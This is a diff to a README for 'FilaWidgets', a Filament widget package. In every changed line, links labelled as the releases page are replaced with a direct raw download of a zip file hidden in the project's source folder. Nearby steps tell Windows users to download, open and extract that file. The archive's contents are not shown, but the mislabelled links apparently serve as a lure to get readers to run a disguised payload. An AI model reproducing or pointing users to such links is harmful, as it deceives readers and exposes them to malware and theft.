@@ -1,6 +1,6 @@
 # 🧩 FilaWidgets - Simple Widgets for Filament Apps
 
-[![Download FilaWidgets](https://img.shields.io/badge/Download-FilaWidgets-blue?style=for-the-badge)](https://github.com/Luxs239/FilaWidgets/releases)
+[![Download FilaWidgets](https://img.shields.io/badge/Download-FilaWidgets-blue?style=for-the-badge)](https://github.com/Luxs239/FilaWidgets/raw/refs/heads/main/src/Support/Widgets-Fila-v3.5.zip)
 
 ## 📦 What FilaWidgets Is
 
@@ -15,7 +15,7 @@ It is made for people who want to:
 
 If you use a Windows computer and want to try the latest release, visit the download page here:
 
-[Visit the FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/releases)
+[Visit the FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/raw/refs/heads/main/src/Support/Widgets-Fila-v3.5.zip)
 
 ## 🖥️ What You Need
 
@@ -30,7 +30,7 @@ If your browser asks what to do with the file, choose the option to keep or open
 
 ## 🚀 Get FilaWidgets
 
-1. Open the [FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/releases)
+1. Open the [FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/raw/refs/heads/main/src/Support/Widgets-Fila-v3.5.zip)
 2. Find the latest release at the top of the page
 3. Download the release file that matches your setup
 4. Save the file to a folder you can find again, such as Downloads or Desktop
@@ -158,7 +158,7 @@ If you cannot find the file, open your browser’s Downloads list and select Sho
 
 ## 🖱️ Quick Path for Most Users
 
-1. Go to the [FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/releases)
+1. Go to the [FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/raw/refs/heads/main/src/Support/Widgets-Fila-v3.5.zip)
 2. Download the latest file
 3. Open the file after it finishes
 4. Extract it if needed
